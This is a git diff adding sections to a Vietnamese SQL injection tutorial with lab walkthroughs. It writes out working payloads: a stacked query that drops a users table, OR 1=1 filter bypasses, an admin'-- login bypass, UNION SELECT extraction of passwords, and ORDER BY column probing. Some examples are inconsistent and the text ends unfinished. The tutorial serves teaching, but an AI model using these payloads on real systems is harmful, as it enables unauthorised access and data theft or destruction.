@@ -38,6 +38,8 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
 
 &rarr;  OR '1'='1' luôn đúng → Hacker đăng nhập được không cần mật khẩu.
 
+---
+
 ## 2. Cách phát hiện lỗ hổng SQL injection
 
 - **Dùng ký tự dấu nháy đơn ' để tìm lỗi**: Đây là một ký tự đặc biệt trong SQL, dùng để bao quanh giá trị dạng chuỗi. Nếu ứng dụng không xử lý đúng input này, nó sẽ làm câu lệnh SQL bị lỗi cú pháp, dẫn đến báo lỗi từ cơ sở dữ liệu.
@@ -94,6 +96,225 @@ SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
 
 - Ngoài ra, SQLi có thể tồn tại trong bất ký vị trí nào trong câu truy vấn, và trong nhiều kiểu truy vấn khác nhau: WHERE, UPDATE, INSERT, ORDER BY, ...
 
+  Ví dụ:
+
+  ```sql
+  INSERT INTO feedback (comment) VALUES ('$input');
+  ```
+
+  Nếu *$input = abcxyz'); DROP TABLE users; --,* thì truy vấn thành:
+
+  ```sql
+  INSERT INTO feedback (comment) VALUES ('abcxyz'); DROP TABLE users; --');
+  ```
+
+  &rarr; Đây là một chuỗi truy vấn nhiều câu lệnh (multi-statement) → Bảng users bị xóa.
+
+---
+
+## 3. Trích xuất dữ liệu ẩn
+
+- Giả sử trên một trang web, user chọn một danh mục ABC và trình duyeejh sẽ gửi yêu cầu như:
+
+  ```url
+  https://website.com/products?category=ABC
+  ```
+
+  Lúc đó, ứng dụng web sẽ sử dụng giá trị "ABC" để tạo ra một truy vấn SQL như sau:
+
+  ```sql
+  SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
+  ```
+
+  với *AND released = 1* chỉ hiển thị các sản phẩm đã được "phát hành" (có thể bán). Do đó khi attacker muốn xem cả các sản phẩm chưa phát hành, tức là released = 0. Ta có thể chèn        thêm vào URL để điều chỉnh câu lệnh SQL như:
+
+  ```url
+  https://website.com/products?category=ABC' OR 1=1 -- 
+  ```
+
+  Tạo ra câu truy vấn:
+
+  ```sql
+  SELECT * FROM products WHERE category = 'ABC' OR 1=1-- ' AND released = 1;
+  ```
+
+  &rarr; OR 1=1 luôn đúng, -- ký hiệu comment → tất cả phần sau -- đều bị bỏ qua và câu *AND released = 1* không còn hiệu lực.
+
+  ⇒ Truy vấn trả về tất cả sản phẩm trong bảng products kể cả không phát hành.
+
+  ⇒ Dữ liệu bị ẩn đã bị lộ.
+
+  ### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+- Với cách thức như vậy, ta thử khai thác với website có các option danh mục như sau:
+
+  <img width="1919" height="872" alt="image" src="https://github.com/user-attachments/assets/90ebd16a-34ee-432d-bc8e-23d4ee4caa90" />
+
+  Ta chọn danh mục Accesstories, lúc này burp suite bắt được request của trình duyệt:
+
+  <img width="1405" height="697" alt="image" src="https://github.com/user-attachments/assets/dea47a0d-7ca1-4f5e-acc7-40db8d082d34" />
+
+  Sử dụng Repeater để gửi lại request đó như sau:
+
+  ```bash
+  GET /filter?category=Accessories' OR 1=1 --
+  ```
+
+  Lúc này câu truy vấn được xử lý sẽ trở thành:
+
+  ```sql
+  SELECT * FROM products WHERE category = 'Accessories' OR 1=1 --' AND released = 1;
+  ```  
+
+  Kết quả thành công, ta sẽ thấy website trả về tất cả các sản phẩm:
+
+  <img width="1839" height="744" alt="image" src="https://github.com/user-attachments/assets/79709f76-6cd3-4d85-8548-3105d3419a31" />
+
+---
+
+## 4. Sai logic xử lý của ứng dụng
+
+- SQLi cũng có thể tổn tại trong form đăng nhập của website. Giả sử user điền "ngoctai" và "password", lúc này ứng dụng sẽ tạo ra câu truy vấn:
+
+  ```sql
+  SELECT * FROM users WHERE username = 'ngoctai' AND password = 'password'
+  ```
+
+  Tuy nhiên, nếu hacker nhập: *username = admin' --* và password là bất kỳ.
+
+  Lúc này câu SQL sinh ra là:
+
+  ```sql
+  SELECT * FROM users WHERE username = 'admin' --' AND password = ''
+  ```
+
+  &rarr; Kết quả --' sẽ làm mọi câu sau nó bị bỏ qua, phần *AND password = ''* bị vô hiệu hóa &rarr; Đăng nhập thành công dù không biết mật khẩu.
+
+  ### Lab: SQL injection vulnerability allowing login bypass
+
+- Với cách thức như vậy, ta thử khai thác một form login như sau:
+
+  <img width="1916" height="872" alt="image" src="https://github.com/user-attachments/assets/0ba5fba3-2c1d-4cda-9906-86004568ea5f" />
+
+  Kiểm tra request gửi thông tin username và password trên burp suite:
+
+  <img width="1415" height="760" alt="image" src="https://github.com/user-attachments/assets/fed945bf-86ac-499e-8cff-affc4036e742" />
+
+  Nhập nội dung username như bên dưới:
+
+  <img width="1919" height="875" alt="image" src="https://github.com/user-attachments/assets/e55f43a0-c435-44b6-aff2-e842ac1d27d2" />
+
+  Lúc này, câu SQL trở thành:
+
+  ```sql
+  SELECT * FROM users WHERE username = 'admin' --' AND password = '123'
+  ```
+
+  Kết quả bypass thành công:
+
+  ![Uploading image.png…]()
+
+---
+
+## 5. SQL injection UNION attacks
+
+- Câu lệnh UNION trong SQL dùng để kết hợp kết quả của 2 hoặc nhiều câu lệnh SELECT thành một tập kết quả duy nhất. Giống như phép hợp trong toán học.
+
+  Cú pháp lệnh UNION như sau:
+
+  ```bash
+  SELECT column1, column2 FROM table1
+  UNION
+  SELECT column1, column2 FROM table2;
+  ```
+
+  Để thực hiện được lợi dụng lệnh UNION, ta cần phải biết hoặc đoán đúng số cột và kiểu dữ liệu trong câu truy vấn gốc. Bởi vì giả sử nếu câu truy vấn gốc select hai cột hợp (union) với   câu truy vấn 1 hoặc 3 cột thì kết quả trả về sẽ lỗi vì không đồng nhất kết quả dữ liệu, do đó mà không thể hiển thị ra giao diện.
+
+  Ví dụ với một URL như sau:
+
+  ```url
+  http://website.com/products.php?id=5
+  ```
+
+  Phía server thực hiện truy vấn:
+
+  ```sql
+  SELECT name, price FROM products WHERE id = 5;
+  ```
+
+  Trong trường hợp nếu ta có thể chèn thêm câu lệnh UNION vào URL như sau:
+
+  ```url
+  http://website.com/products.php?id=5 UNION SELECT username, password FROM users
+  ```
+
+  Câu truy vấn sẽ trở thành:
+
+  ```sql
+  SELECT name, price FROM products WHERE id = 5
+  UNION
+  SELECT username, password FROM users;
+  ```
+
+  &rarr; Kết quả ta sẽ thấy cột username và password từ bảng users hiển thị ra trang web.
+
+---
+
+## 5. Xác định số lượng cột
+
+- Như đã nói ở mục trước, khi muốn sử dụng UNION SELECT để trích xuất dữ liệu từ bảng khác, thì số lượng cột trong truy vấn gốc và truy vấn bạn chèn vào phải bằng nhau.
+
+- Một phương pháp để xác định là sử dụng mệnh đề *ORDER BY*, lệnh này được sử dụng để sắp xếp kết quả truy vấn (query results) theo một hoặc nhiều cột.
+
+- Với *ORDER BY <index>* sẽ thực hiện sắp xếp kết quả theo vị trí cột được chỉ định trong câu lệnh SELECT.
+
+- Ví dụ:
+
+  ```sql
+  SELECT name, age, gpa
+  FROM students
+  ORDER BY 2;  -- tức là sắp xếp theo cột thứ 2 là 'age'
+  ```
+
+  &rarr; Nếu ta chỉ định một số lớn hơn số lượng cột thực tế, SQL sẽ báo lỗi. Do đó có thể lợi dụng điều này để khai thác xác định số lượng cột.
+
+- Giả sử ta thực hiện lần lượt tạo các tham số id trong URL như sau:
+
+  ```url
+  http://example.com/product?id=1' ORDER BY 1-- 
+  http://example.com/product?id=1' ORDER BY 2-- 
+  http://example.com/product?id=1' ORDER BY 3-- 
+  ...
+  ```
+
+  Mỗi payload sẽ được tạo một câu truy vấn như sau:
+
+  ```sql
+  SELECT name, description FROM products WHERE id='1' ORDER BY 1-- 
+  ```
+
+  Do đó khi ta tăng dần số lượng:
+
+  ```bash
+  ' ORDER BY 1-- → OK 
+
+  ' ORDER BY 2-- → OK 
+
+  ' ORDER BY 3-- → Lỗi (vì bảng chỉ có 2 cột)
+  ```
+
+  &rarr; Kết luận câu truy vấn gốc thực hiện truy vấn hai cột.
+
+- Một phương pháp khác là sử dụng *UNION SELECT NULL*
+
+
+
+
   
+
+  
+
+  
+
   
 
